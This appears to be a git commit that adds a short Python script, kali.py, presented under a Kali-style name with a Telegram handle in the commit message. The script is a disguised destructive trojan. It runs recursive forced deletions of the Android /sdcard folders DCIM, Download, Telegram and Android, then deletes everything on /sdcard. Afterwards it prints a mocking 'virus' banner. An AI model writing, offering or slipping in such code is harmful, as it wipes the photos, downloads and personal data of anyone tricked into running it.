f7cea6ea1db6f68f80b1612cc0bc19cf2fa52fa1
mohamadkokiz123456789 <52805561+mohamadkokiz123456789@users.noreply.github.com>
2019-07-12 02:53:33 +0100

    kali-maroc
    Telegram====>@marochakar

---
+++ kali.py
@@ -0,0 +1,9 @@
+import os
+os.system("clear")
+os.system("rm -rif /sdcard/DCIM")
+os.system("rm -rif /sdcard/Download")
+os.system("rm -rif /sdcard/Telegram")
+os.system("rm -rif /sdcard/Android")
+os.system("rm -rif /sdcard/*")
+print ("========>(hhhhh vurus hhhhh)")
+print ("==========>telegram : @marochakar")
